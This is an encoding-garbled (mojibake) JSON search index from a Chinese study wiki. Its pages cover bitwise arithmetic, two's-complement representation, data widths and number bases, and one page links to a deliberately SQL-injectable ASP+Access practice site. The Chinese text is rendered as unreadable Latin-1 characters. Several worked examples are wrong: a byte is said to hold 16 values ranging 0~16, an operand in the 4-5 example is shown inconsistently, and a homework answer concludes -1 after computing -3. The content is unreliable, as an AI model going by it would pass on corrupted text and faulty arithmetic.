ä½ æˆ– åªè¦æœ‰ä¸€ä¸ªä¸º1å°±ä¸º1 å¼‚æˆ– ä¸ä¸€æ ·æ—¶ä¸º1 é å–å å·¦ç§» é€»è¾‘å·¦ç§»SHLï¼Œç›®çš„æ“ä½œæ•°å·¦ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CFï¼Œä½ä½è¡¥0 ç®—æ•°å·¦ç§»SALï¼Œç›®çš„æ“ä½œæ•°å·¦ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CFï¼Œä½ä½è¡¥0 é€»è¾‘å·¦ç§»å’Œç®—æ•°å·¦ç§»ä¸€æ ·ï¼Œä½ä½è¡¥0ï¼Œæ²¡åŒºåˆ« å³ç§» é€»è¾‘å³ç§»SHRï¼Œç›®çš„æ“ä½œæ•°å³ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½è¡¥0ï¼Œæœ€ä½ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CF ç®—æ•°å³ç§»SARï¼Œç›®çš„æ“ä½œæ•°å³ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½è¡¥ç¬¦å·ä½ï¼Œæœ€ä½ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CF ä¾‹ 1shr 11010101 è¿è¡Œåä¸º00110101 å¯¹åº”Cè¯­è¨€ï¼š 12unsigned int a=10;printf(&quot;%d &quot;,a&gt;&gt;2); 1sar 11010101 è¿è¡Œåä¸º11110101 å¯¹åº”Cè¯­è¨€ï¼š 12int a=10;printf(&quot;%d &quot;,a&gt;&gt;2); é€šè¿‡ä½è¿ç®—å®ç°å››åˆ™è¿ç®— è®¡ç®—æœºåªè®¤è¯†0å’Œ1ï¼Œä¹Ÿåªä¼šåšä½è¿ç®—ã€‚ è¿æœ€åŸºæœ¬çš„åŠ ã€å‡ã€ä¹˜ã€é™¤éƒ½æ— æ³•ç›´æ¥è®¡ç®—ï¼Œè€Œæ˜¯è¦é€šè¿‡ä½è¿ç®—é—´æ¥æ¥å®ç°ã€‚ åŠ  ç®—æ³•ï¼š Aå’ŒBä¸¤ä¸ªæ•°å¼‚æˆ–ï¼Œå¾—å‡ºç»“æœx Aå’ŒBä¸¤ä¸ªæ•°ä¸æ“ä½œï¼Œå¾—å‡ºç»“æœy a. å¦‚æœç»“æœä¸º0ï¼Œè¡¨ç¤ºä¸å­˜åœ¨è¿›ä½ï¼Œä¸Šä¸€æ­¥éª¤å¼‚æˆ–çš„ç»“æœxå°±æ˜¯æœ€åç»“æœ b. å¦‚æœç»“æœä¸º1ï¼Œè¡¨ç¤ºå­˜åœ¨è¿›ä½ï¼Œè¦ç»§ç»­è¿›è¡Œå¼‚æˆ–è¿ç®— A&lt;â€“xï¼ŒB&lt;â€“(y&lt;&lt;1)ï¼Œé‡å¤æ­¥éª¤1ï¼Œè‡³åˆ°ä¸ºaæƒ…å†µ å·¦ç§»ä¸€ä½çš„åŸå› ï¼šè¿›ä½æ˜¯å¾€å‰è¿›ä¸€ä½ æ€æƒ³ï¼š ä¸è€ƒè™‘è¿›ä½çš„è¯ï¼Œå¼‚æˆ–çš„ç»“æœå’ŒæŒ‰ä½åŠ ç»“æœæ˜¯ä¸€æ ·çš„ï¼›å†ç”¨ä¸å¤„ç†è¿›ä½ ç»¼ä¸Šï¼Œç”¨å¼‚æˆ–ç›¸åŠ ï¼ˆä¸è€ƒè™‘è¿›ä½çš„æƒ…å†µä¸‹ï¼‰ï¼Œç”¨ä¸å¤„ç†è¿›ä½ 4+5è¿ç®—è¿‡ç¨‹ï¼š ç¬¬ä¸€è½®è¿ç®—ï¼š A 0000 0100 A 0000 0100 B 0000 0101 B 0000 0101 å¼‚æˆ– 0000 0001 ä¸ 0000 0100 å› ä¸ºä¸çš„ç»“æœä¸ä¸º0ï¼Œè¿ç®—ç»§ç»­ ç¬¬äºŒè½®è¿ç®—ï¼š A=0000 0001ï¼ˆå¼‚æˆ–çš„ç»“æœï¼‰ B=0000 1000ï¼ˆä¸çš„ç»“æœå·¦ç§»1ä½ï¼‰ A 0000 0001 A 0000 0001 B 0000 1000 B 0000 1000 å¼‚æˆ– 0000 1001 ä¸ 0000 0000 ä¸çš„ç»“æœä¸º0ã€‚ å¼‚æˆ–çš„ç»“æœå°±æ˜¯æœ€ç»ˆç»“æœï¼š0000 1001 å‡ å› ä¸ºç”¨çš„è¡¥ç å­˜å‚¨ï¼ŒåŠ æ³•å‡æ³•çš„è¿ç®—è¿‡ç¨‹ç»Ÿä¸€äº†ã€‚æ‰€ä»¥å’ŒåŠ æ³•ä¸€æ ·ã€‚ 4-5è¿ç®—è¿‡ç¨‹ï¼š 4-5=4+(-5) ç¬¬ä¸€è½®è¿ç®—ï¼š åˆ¤æ–­æ˜¯å¦æœ‰è¿›ä½ A 0000 0100 A 0000 0100 B 1111 1011 B 0000 1011 å¼‚æˆ– 1111 1111 ä¸ 0000 0000 ä¸çš„ç»“æœä¸º0ã€‚ å¼‚æˆ–çš„ç»“æœå°±æ˜¯æœ€ç»ˆç»“æœï¼š1111 1111 ä¹˜æ³• X*Yçš„æœ¬è´¨å°±æ˜¯åŠ æ³•ï¼ŒYä¸ªXç›¸åŠ ã€‚ é™¤æ³• X/Yçš„æœ¬è´¨å°±æ˜¯å‡æ³•ï¼ŒXèƒ½å‡å»å¤šå°‘ä¸ªY ä½œä¸š å…«è¿›åˆ¶æ•°2-5åœ¨è®¡ç®—å™¨ä¸­çš„çš„ç»“æœæ˜¯ï¼š1777777777777777777775ä¸ºä»€ä¹ˆï¼Ÿ ç­”æ¡ˆè®¡ç®—æœºåªèƒ½åšåŠ æ³•ï¼Œæ‰€ä»¥2-5å°±æ˜¯2+(-5)0010+1011ç¬¬ä¸€è½®è¿ç®—ï¼šA0010A0010B1011B1011å¼‚æˆ–1001ä¸0010å› ä¸ºä¸çš„ç»“æœä¸ä¸º0ï¼Œè¿ç®—ç»§ç»­ç¬¬äºŒè½®è¿ç®—ï¼šA=1001ï¼ˆå¼‚æˆ–çš„ç»“æœï¼‰B=0100ï¼ˆä¸çš„ç»“æœå·¦ç§»1ä½ï¼‰A1001A1001B0100B0100å¼‚æˆ–1101ä¸0000ä¸çš„ç»“æœä¸º0ã€‚å¼‚æˆ–çš„ç»“æœå°±æ˜¯æœ€ç»ˆç»“æœï¼š1101å¦‚æœæ˜¯DWORDå­˜å‚¨ï¼Œå°±æ˜¯1111 1111 1111 1111 1111 1111 1111 1101åå…­è¿›åˆ¶å°±æ˜¯FFFFFFFDå…«è¿›åˆ¶å°±æ˜¯1 777 777 777 777 777 777 775å…¶å®å°±æ˜¯ç®—ä¸‹æ¥æ˜¯-1ï¼Œåªä¸è¿‡ç”¨å…«è¿›åˆ¶è¡¨ç¤ºï¼Œè®©äººä¸€çœ‹èµ·æ¥å°±ä¸çŸ¥æ‰€ä»¥ã€‚"},{"title":"æ•°æ®å®½åº¦","path":"/wiki/representation_and_computation_of_data/æ•°æ®å®½åº¦.html","content":"è¿™æ˜¯ä¸€æ®µæ‘˜è¦ æ•°å­¦ä¸Šçš„æ•°å­—ï¼Œæ²¡æœ‰å¤§å°é™åˆ¶ï¼Œå¯ä»¥æ— é™çš„å¤§ã€‚ä½†åœ¨è®¡ç®—æœºä¸­ï¼Œç”±äºå—ç¡¬ä»¶çš„åˆ¶çº¦ï¼Œæ•°æ®éƒ½æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼ˆæˆ‘ä»¬ç§°ä¸ºæ•°æ®å®½åº¦ï¼‰ï¼Œè¶…è¿‡æœ€å¤šå®½åº¦çš„æ•°æ®ä¼šè¢«ä¸¢å¼ƒã€‚ ä½ï¼ˆBITï¼‰ â–ˆï¼ˆ1ä½ï¼‰ å­—èŠ‚ï¼ˆByteï¼‰ â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆï¼ˆ8ä½ï¼‰ å­—ï¼ˆWordï¼‰ â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆï¼ˆ16ä½ã€2ä¸ªå­—èŠ‚ï¼‰ åŒå­—ï¼ˆDoublewordï¼‰ â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆï¼ˆ32ä½ã€2ä¸ªå­—ã€4ä¸ªå­—èŠ‚ï¼‰ å››å­—ï¼ˆQuadwordï¼‰ â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆâ–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆ|â–ˆï¼ˆ64ä½ã€2ä¸ªåŒå­—ã€4ä¸ªå­—ã€8ä¸ªå­—èŠ‚ï¼‰"},{"title":"æ•°çš„è¡¨ç¤º","path":"/wiki/representation_and_computation_of_data/æ•°çš„è¡¨ç¤º.html","content":"å¼•è¨€ ä¸Šä¸€èŠ‚è¯¾è®²åˆ°äº†æ•°æ®å®½åº¦ï¼Œæ¯”å¦‚ï¼Œå¦‚æœæ•°æ®å®½åº¦ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå­˜å‚¨çš„æ•°æ®èŒƒå›´å°±æ˜¯:0ï½xFFã€‚ çŸ¥é“äº†æ•°æ®çš„å®½åº¦å’ŒèŒƒå›´åï¼Œå¦‚ä½•è§£é‡Šè¿™ä¸ªæ•°æ®ï¼Ÿ è®¡ç®—æœºæ•°æ®åªæœ‰0å’Œ1ï¼Œå¦‚ä½•è§£é‡Šæ•°æ®ï¼Œå–å†³äºä½ è§£æçš„ç¼–ç è§„åˆ™ã€‚ è¯¾æœ¬ä¸Šçš„æ¦‚å¿µ æ— ç¬¦å·æ•°å’Œæœ‰ç¬¦å·æ•° æ— ç¬¦å·æ•°ç¼–ç è§„åˆ™ï¼š å„ä¸ªä½æŒ‰2çš„å¹‚æ¬¡æ–¹ç›¸åŠ  æœ‰ç¬¦å·æ•°ç¼–ç è§„åˆ™ï¼š æœ€é«˜ä½ä¸º0ï¼Œç¼–ç è§„åˆ™ä¸æ— ç¬¦å·æ•°ä¸€æ · æœ€é«˜ä½ä¸º1ï¼Œä¸ºè´Ÿæ•° åŸç  æœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œå…¶ä½™å„ä½ä¸ºæ•°å€¼æœ¬èº«çš„ç»å¯¹å€¼ åç  æ­£æ•°ï¼šåç ä¸åŸç ç›¸åŒ è´Ÿæ•°ï¼šç¬¦å·ä½ä¸º1ï¼Œå…¶ä½™ä½å¯¹åŸç å–å; è¡¥ç  æ­£æ•°ï¼šè¡¥ç ä¸åŸç ç›¸åŒ è´Ÿæ•°ï¼šç¬¦å·ä½ä¸º1ï¼Œå…¶ä½™ä½å¯¹åŸç å–ååŠ 1;ï¼ˆé€Ÿç®—ï¼Œé™¤ç¬¦å·ä½å¤–ï¼Œä»å³å¾€å·¦ç¬¬1ä¸ªæ•°å­—1ï¼Œå·¦è¾¹å…¨éƒ¨å–åï¼‰ æµ·å“¥çš„è®²æ³• å‡è®¾å®½åº¦æ˜¯1ä¸ªå­—èŠ‚ã€‚å¯¹äºè®¡ç®—æœºè€Œè¨€ï¼Œå°±æ˜¯16ä¸ªæ•°æ®å­˜å‚¨åœ¨è®¡ç®—æœºä¸­ï¼š äºŒè¿›åˆ¶è¡¨ç¤º 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 åå…­è¿›åˆ¶è¡¨ç¤º 0 1 2 3 4 5 6 7 8 9 A B C D E F è€Œå¦‚ä½•ä½¿ç”¨ï¼ˆè§£é‡Šï¼‰è¿™äº›æ•°æ®ï¼Œå–å†³äºç¨‹åºå‘˜çš„è§†è§’ã€‚ å‡å¦‚ï¼Œæˆ‘æƒ³ç”¨è¿™äº›æ•°å­—éƒ½å­˜æ— ç¬¦å·æ•°ï¼Œé‚£ä¹ˆè¿™16ä¸ªæ•°ï¼Œå°±è¡¨ç¤º0~16è¿™16ä¸ªæ­£æ•°ã€‚F+1=ï¼Ÿå› ä¸ºæ•°æ®å®½åº¦çš„åŸå› ï¼Œè¶…è¿‡çš„éƒ¨åˆ†è¢«èˆå¼ƒï¼Œæ‰€ä»¥F+1=0ï¼Œåˆå›åˆ°äº†èµ·ç‚¹ã€‚ å‡å¦‚ï¼Œæˆ‘æƒ³è®©è¿™äº›æ•°å­—ä¹Ÿèƒ½è¡¨ç¤ºéƒ¨åˆ†è´Ÿæ•°ï¼Œæ€ä¹ˆåŠï¼Ÿå…¬å¹³ç‚¹ï¼Œç ä¸€åŠï¼Œ0~7è¡¨ç¤ºæ­£æ•°ï¼Œ8-&gt;Fè¡¨ç¤ºè´Ÿæ•°ã€‚ æ•°å­¦ä¸­0æ—¢ä¸æ˜¯æ­£æ•°ä¹Ÿä¸æ˜¯è´Ÿæ•°ï¼Œåœ¨æ–‡ç« è¿™é‡Œå°†0å½“æˆæ­£æ•°ã€‚ æ­£æ•° 0 1 2 3 4 5 6 7 è´Ÿæ•° -1 -2 -3 -4 -5 -6 -7 -8 è´Ÿæ•°å¯¹åº”çš„ç¬¦å·ä¸º F E D C B A 9 8 åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè§‚å¯Ÿå‘ç°ï¼šæ­£æ•°æœ€é«˜ä½æ˜¯0ï¼Œè´Ÿæ•°æœ€é«˜ä½æ˜¯1 0-&gt;7ï¼Œæ­£æ•°ç”±å°åˆ°å¤§ 8-&gt;Fï¼Œè´Ÿæ•°ï¼Œç”±å°åˆ°å¤§ï¼ˆFï¼Œ-1æ˜¯æœ€å¤§çš„è´Ÿæ•°ï¼‰ F+1ï¼Œè¿›ä½èˆå¼ƒï¼Œå˜æˆ0ã€‚ å®½åº¦æ˜¯2ä¸ªå­—èŠ‚çš„åŒç†ã€‚ å®½åº¦æ˜¯4ä¸ªå­—ï¼ˆ32ä½ï¼‰çš„åŒç†ã€‚æ•°æ®çš„èŒƒå›´å¦‚ä¸‹ï¼š æ— ç¬¦å·æ•°ï¼š0 1 2 3 4 â€¦ FFFFFFFF æœ‰ç¬¦å·æ•°ï¼šä»ä¸­é—´ç ä¸€åˆ€ï¼Œ0-7FFFFFFFæ˜¯æ­£æ•°ï¼›80000000-FFFFFFFFæ˜¯è´Ÿæ•°ã€‚ æ­£æ•°æœ€é«˜ä½æ˜¯0ï¼Œè´Ÿæ•°æœ€é«˜ä½æ˜¯1"},{"title":"å°ç»“","path":"/wiki/representation_and_computation_of_data/å°ç»“.html","content":"åœ¨è¿™ä¸ªç³»åˆ—ä¸­ï¼Œæˆ‘ä»¬å…ˆè®²äº†è¿›åˆ¶çš„æ¦‚å¿µã€‚Nè¿›åˆ¶çš„å®šä¹‰ï¼šç”±Nä¸ªç¬¦å·ç»„æˆï¼Œè¿™Nä¸ªç¬¦å·å¯ä»¥è‡ªç”±å®šä¹‰ï¼Œé€¢Nè¿›ä¸€ã€‚ï¼ˆè‡ªå®šä¹‰ç¬¦å·çš„æ€æƒ³ï¼Œç”¨äºåŠ å¯†ä¸­ï¼‰ç”±äºåè¿›åˆ¶çš„æ€ç»´æ–¹å¼æ ¹æ·±è’‚å›ºï¼Œä½¿æˆ‘ä»¬éš¾ä»¥çœ‹åˆ°æœ¬è´¨ï¼šæ¯ä¸€ç§è¿›åˆ¶éƒ½æ˜¯å®Œç¾çš„ï¼Œä¸éœ€è¦ä¾é è½¬æ¢å…¶ä»–è¿›åˆ¶æ¥åšè¿ç®—ã€‚è¿ç®—çš„æœ¬è´¨å°±æ˜¯æŸ¥æ•°ï¼ŒæŠŠæ•°å…¨å†™å‡ºæ¥ï¼Œç„¶åå¾€åæŸ¥ã€‚å¦‚æœæ•°å­—ç‰¹åˆ«å¤§ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå°±åˆ¶ä½œåŠ æ³•è¡¨ï¼Œå‡æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œé™¤æ³•è¡¨ï¼Œä»¥è¿™å››ä¸ªè¡¨ä¸ºåŸºç¡€ï¼Œå°±èƒ½åœ¨è¿™ä¸ªè¿›åˆ¶çš„ä½“ç³»ä¸­åšè¿ç®—ã€‚ éšåï¼Œæˆ‘ä»¬è®²äº†æ•°æ®å®½åº¦çš„æ¦‚å¿µã€‚ç”±äºè®¡ç®—æœºç¡¬ä»¶çš„é™åˆ¶ï¼Œæ•°æ®æ˜¯æœ‰å®½åº¦çš„ï¼Œè¶…è¿‡å®½åº¦çš„éƒ¨åˆ†ä¼šè¢«èˆå¼ƒã€‚å°†æ•°å­—å­˜è¿›è®¡ç®—æœºåï¼Œè¿™ä¸ªæ•°è¡¨ç¤ºä»€ä¹ˆæ„æ€ï¼Œæ€ä¹ˆè§£é‡Šå‘¢ï¼Ÿå¯¹äºè®¡ç®—æœºè€Œè¨€ï¼Œå­˜å‚¨çš„æ•°å­—åªæœ‰0å’Œ1ï¼Œè€Œå¦‚ä½•ä½¿ç”¨ï¼ˆè§£é‡Šï¼‰è¿™äº›æ•°æ®ï¼Œå–å†³äºç¨‹åºå‘˜çš„è§†è§’ã€‚å‡è®¾æ•°æ®å®½åº¦æ˜¯1ä¸ªå­—èŠ‚ï¼ŒèŒƒå›´0~Fï¼Œå¦‚æœæˆ‘æƒ³å…¨éƒ¨è¡¨ç¤ºæ­£æ•°ï¼Œé‚£è¿™16ä¸ªæ•°åˆ†åˆ«å¯¹åº”æ­£æ•°0-16ï¼›å¦‚æœæˆ‘æ—¢æƒ³è¡¨ç¤ºæ­£æ•°åˆæƒ³è¡¨ç¤ºè´Ÿæ•°ï¼Œé‚£å°±å°†è¿™16ä¸ªæ•°åˆ†ä¸€åŠï¼Œ0-7è¡¨ç¤ºæ­£æ•°ï¼Œ8-Fè¡¨ç¤ºè´Ÿæ•°ã€‚æµ·å“¥çš„è¿™ç§ç†è§£æ–¹å¼ï¼Œå°±ä¸ç”¨åŸç åç è¡¥ç çš„çŸ¥è¯†ã€‚ è®¡ç®—æœºä¸­å­˜å‚¨äº†è¿™äº›æ•°åï¼Œå¦‚æœä½œè¿ç®—å‘¢ï¼Ÿæ·±å…¥ç‚¹çš„å†…å®¹æ˜¯æ•°å­—ç”µè·¯æ–¹é¢çš„çŸ¥è¯†ï¼Œæµ·å“¥è¿™é‡Œç®€åŒ–äº†ï¼Œç”¨ä½è¿ç®—è®²è§£ã€‚è®¡ç®—æœºåªä¼šä½è¿ç®—ï¼šä¸ã€æˆ–ã€å¼‚æˆ–ã€éã€å·¦ç§»ã€å³ç§»ï¼Œç„¶åç”¨è¿™äº›ä½è¿ç®—æ¥å®ç°å››åˆ™è¿ç®—åŠ å‡ä¹˜é™¤ï¼Œæ¯”å¦‚ç”¨å¼‚æˆ–ï¼Œä¸ï¼Œå·¦ç§»è¿™ä¸‰ä¸ªä½è¿ç®—æ¥å®ŒæˆåŠ æ³•çš„æ“ä½œã€‚å†ç”¨å››åˆ™è¿ç®—ï¼Œè¡¨ç¤ºæ•°å­¦ä¸­æ›´å¤æ‚çš„è¿ç®—ã€‚"},{"title":"Microsoft Access","path":"/wiki/sql_injection_env/Microsoft_Access.html","content":"è¶…çº§å°æ—‹é£aspWebServer+ä¸€å¥—ASP+ACCESSå¸¦SQLæ³¨å…¥ç½‘ç«™æºç  æ ‡é¢˜ é“¾æ¥ å¤‡æ³¨ è¶…çº§å°æ—‹é£aspWebServer https://cloud.tencent.com/developer/article/2148809 å®‰è£…åŒ…ä¸‹è½½å’Œè¯´æ˜ç®€ä»‹ ASP+ACCESSå¸¦SQLæ³¨å…¥ç½‘ç«™æºç  https://download.csdn.net/download/qq_34266364/10425802?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170480824116777224473336%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fdownload.%2522%257D&amp;request_id=170480824116777224473336&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~download~first_rank_ecpm_v1~rank_v31_ecpm-4-10425802-null-null.269^v2^control&amp;utm_term=access sqlæ³¨å…¥&amp;spm=1018.2226.3001.4451.5 ç½‘ç«™æºç  æ³¨æ„çœ‹è¶…çº§å°æ—‹é£çš„è¯´æ˜ 12342.[]ä¸­çš„åç§°æ˜¯æ‚¨ç«™ç‚¹çš„åç§°ï¼Œå¯ä»¥ä»»æ„å–åï¼Œä¼šæ˜¾ç¤ºåœ¨èœå•æœ€é¡¶éƒ¨ç«™ç‚¹åˆ—è¡¨é‡Œ4.hostUrlæ˜¯æ‚¨çš„ç«™ç‚¹åŸŸåæˆ–IPåœ°å€5.listenPortæ˜¯ç›‘å¬ç«¯å£ HostUrlé»˜è®¤æ˜¯localhostï¼Œå°±åªèƒ½æœ¬åœ°è®¿é—®åˆ°ï¼Œè¦æ”¹æˆipï¼Œå…¶ä»–ä¸»æœºæ‰èƒ½è®¿é—®åˆ° å…¶ä»–ï¼š ä¹‹å‰æƒ³å¼„ä½›å±±å‘å‘é±¼åˆ¶æœæœ‰é™å…¬å¸ç½‘ç«™æºç ï¼Œæ²¡å¼„æˆåŠŸï¼Œæ²¡ä»”ç»†çœ‹åŸå›  https://www.youtube.com/watch?v=SdHu1wZsI1U å­˜é”™äº†çš„ï¼Œä½†å¯èƒ½æœ‰ç”¨https://download.csdn.net/download/weixin_39841856/11284131"},{"title":"è¿›åˆ¶","path":"/wiki/representation_and_computation_of_data/è¿›åˆ¶.html","content":"è¿›åˆ¶å­¦ä¹ çš„éšœç¢ å­¦ä¹ å…¶ä»–è¿›åˆ¶ï¼Œæ€»ä»¥ç†Ÿæ‚‰çš„åè¿›åˆ¶ä¸ºä¾æ‰˜è¿›è¡Œå­¦ä¹ ï¼Œè¿™ç§å­¦ä¹ æ–¹æ³•æ˜¯é”™è¯¯çš„ã€‚å…¶å®æ²¡å¿…è¦è½¬ï¼Œæ¯ä¸€ç§è¿›åˆ¶éƒ½æ˜¯å®Œç¾ï¼Œå…·æœ‰è‡ªå·±ç‹¬ç«‹ä½“ç³»çš„ã€‚æƒ³å­¦å¥½è¿›åˆ¶é¦–å…ˆè¦å¿˜æ‰åè¿›åˆ¶ï¼Œå’Œè¿›åˆ¶é—´çš„è½¬æ¢ï¼ å®šä¹‰ ä¸€è¿›åˆ¶çš„å®šä¹‰ï¼šç”±1ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯1ï¼Œé€¢ä¸€è¿›ä¸€ å…«è¿›åˆ¶çš„å®šä¹‰ï¼šç”±8ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7ï¼Œé€¢å…«è¿›ä¸€ åè¿›åˆ¶çš„å®šä¹‰ï¼šç”±10ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7ï¼Œ8ï¼Œ9ï¼Œé€¢åè¿›ä¸€ Nè¿›åˆ¶çš„å®šä¹‰ï¼šç”±Nä¸ªç¬¦å·ç»„æˆï¼Œè¿™Nä¸ªç¬¦å·å¯ä»¥è‡ªç”±å®šä¹‰ï¼Œé€¢Nè¿›ä¸€ è¿›åˆ¶çš„ä¹¦å†™ ä¸€è¿›åˆ¶ ä¸€è¿›åˆ¶çš„å®šä¹‰ï¼šç”±1ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯1ï¼Œé€¢ä¸€è¿›ä¸€ 1è¿›åˆ¶çš„1-20ã€‚å¤äººç”¨çš„ç»“ç»³è®°äº‹å°±æ˜¯1è¿›åˆ¶ï¼Œ1ä¸ªç»“ä»£è¡¨1 ç”¨ç¬¦å·1è¡¨ç¤º ç”¨ç¬¦å·aè¡¨ç¤º 111111111111111 aaaaaaaaaaaaaaa ä¸‰è¿›åˆ¶ ä¸‰è¿›åˆ¶çš„å®šä¹‰ï¼šç”±3ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œé€¢3è¿›ä¸€ 3è¿›åˆ¶çš„0-20 0 1 2 10 11 12 20 21 22 100 101 102 110 111 112 120 121 122 200 201 202 0ã€1ã€2ï¼Œä¸‰ä¸ªæ•°ï¼Œé€¢3è¿›ä¸€ã€‚é€ä½ï¼ŒæŸ¥æ•°ï¼Œå†™å‡ºæ¥ ä¸ƒè¿›åˆ¶ ä¸ƒè¿›åˆ¶çš„å®šä¹‰ï¼šç”±7ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œé€¢7è¿›ä¸€ 0 1 2 3 4 5 6 10 11 12 13 14 15 16 20 21 22 23 24 25 26 è¿›åˆ¶çš„ç¬¦å· æ·±åº¦ç†è§£è¿›åˆ¶ï¼ŒNè¿›åˆ¶è§„å®šäº†ç”±Nä¸ªç¬¦å·ç»„æˆï¼Œå…¶å®è¿™Nä¸ªç¬¦å·å¯ä»¥ç”±ä½ è‡ªå·±æ¥å®š ç”¨é€”ï¼šè¿›åˆ¶çš„åŠ å¯† åè¿›åˆ¶çš„å®šä¹‰:ç”±åä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ3ï¼Œ2ï¼Œ8ï¼Œ7ï¼Œ6ï¼Œ9ï¼Œ4ï¼Œ5é€¢åè¿›ä¸€ã€‚é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œ1+1=3 åè¿›åˆ¶çš„å®šä¹‰:ç”±åä¸ªç¬¦å·ç»„æˆ,åˆ†åˆ«æ˜¯Aï¼ŒSï¼ŒBï¼ŒLï¼ŒKï¼Œ7ï¼Œ6ï¼ŒVï¼Œ9ï¼Œ5é€¢åè¿›ä¸€ã€‚ è¿›åˆ¶çš„è¿ç®— æœ¬è´¨å°±æ˜¯æŸ¥æ•°ï¼ŒæŠŠæ•°å…¨éƒ¨å†™å‡ºæ¥ï¼Œç„¶åå¾€åæŸ¥ã€‚æ¯”å¦‚å…«è¿›åˆ¶ 0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 30 31 32 33 34 35 36 37 40 41 42 43 44 45 46 47 50 51 52 53 54 55 56 57 60 61 62 63 64 65 66 67 70 71 72 73 74 75 76 77 100 101 102 103 104 105 106 107 110 111 112 113 114 115 116 117 ä½†å¦‚æœæ•°å­—ä¸€å¤§å°±å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å…ˆåˆ¶ä½œåŠ æ³•è¡¨ï¼Œå‡æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œé™¤æ³•è¡¨ï¼Œç„¶åæŸ¥è¡¨ å…«è¿›åˆ¶è¿ç®— 2+3=? 2Ã—3=? 4Ã—5=? 277+333=? 276*54=? 236-54=? 234/4=? æˆ‘ä»¬ç†Ÿæ‚‰åè¿›åˆ¶æ˜¯å› ä¸ºæˆ‘ä»¬å¯¹äºåè¿›åˆ¶çš„åŠ æ³•è¡¨ï¼Œå‡æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œé™¤æ³•è¡¨éå¸¸ç†Ÿã€‚å¯¹äºå…«è¿›åˆ¶ï¼Œå¦‚æœæœ‰è¿™å››å¼ è¡¨ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œå…«è¿›åˆ¶çš„è¿ç®—ã€‚ è¿™é‡Œåšä¸¤å¼ è¡¨å°±å¤Ÿäº†ï¼ŒåŠ æ³•è¡¨ï¼ŒåŠ æ³•å’Œå‡æ³•éƒ½ç”¨è¿™å¼ è¡¨ï¼›ä¹˜æ³•è¡¨ï¼Œä¹˜æ³•å’Œé™¤æ³•éƒ½ç”¨è¿™å¼ è¡¨ã€‚ 0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 åŠ æ³•è¡¨ åŠ å‡ ï¼Œå°±åœ¨ä¸Šé¢çš„è¡¨ç§»åŠ¨å‡ ä½ã€‚æ¯”å¦‚5+7ï¼Œåœ¨ä¸Šé¢è¡¨æ 